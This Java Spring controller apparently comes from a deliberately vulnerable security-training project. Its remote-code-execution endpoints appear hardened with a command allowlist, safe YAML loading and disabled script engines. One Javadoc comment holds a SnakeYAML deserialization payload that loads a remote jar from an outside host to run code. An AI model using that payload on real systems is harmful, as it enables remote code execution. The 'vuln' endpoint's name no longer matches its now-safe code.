package org.joychou.controller;

import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.Set;
import java.util.HashSet;


/**
 * Java code execute
 *
 * @author JoyChou @ 2018-05-24
 */
@Slf4j
@RestController
@RequestMapping("/rce")
public class Rce {

    private static final Set<String> ALLOWED_COMMANDS = new HashSet<>(Arrays.asList(
            "whoami", "id", "hostname", "date", "uptime", "uname"
    ));

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        if (cmd == null || !ALLOWED_COMMANDS.contains(cmd.trim())) {
            return "Command not allowed. Allowed commands: " + ALLOWED_COMMANDS;
        }
        StringBuilder sb = new StringBuilder();

        try {
            ProcessBuilder processBuilder = new ProcessBuilder(cmd.trim());
            processBuilder.redirectErrorStream(true);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            return e.toString();
        }
        return sb.toString();
    }


    /**
     * <a href="http://localhost:8080/rce/ProcessBuilder?cmd=whoami">POC</a>
     */
    @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {

        if (cmd == null || !ALLOWED_COMMANDS.contains(cmd.trim())) {
            return "Command not allowed. Allowed commands: " + ALLOWED_COMMANDS;
        }
        StringBuilder sb = new StringBuilder();

        try {
            ProcessBuilder pb = new ProcessBuilder(cmd.trim());
            pb.redirectErrorStream(true);
            Process p = pb.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            return e.toString();
        }

        return sb.toString();
    }


    /**
     * JavaScript evaluation endpoint.
     * Rejects arbitrary script URLs to prevent RCE via ScriptEngine.
     *
     * @param jsurl js url
     */
    @GetMapping("/jscmd")
    public String jsEngine(String jsurl) {
        // Loading and executing arbitrary remote JavaScript via ScriptEngine allows RCE.
        // Reject all requests; there is no safe way to eval untrusted JS with Java access.
        return "Remote JS execution is disabled for security reasons.";
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    /**
     * Groovy evaluation endpoint.
     * Evaluating arbitrary user-supplied Groovy scripts allows RCE.
     * @param content groovy shell
     */
    @GetMapping("groovy")
    public String groovyshell(String content) {
        // Evaluating untrusted Groovy scripts allows arbitrary code execution.
        // Reject all requests; there is no safe sandbox for GroovyShell with untrusted input.
        return "Groovy script execution is disabled for security reasons.";
    }



    public static void main(String[] args) throws Exception {
        ProcessBuilder pb = new ProcessBuilder("touch", "/tmp/x");
        pb.start();
    }
}

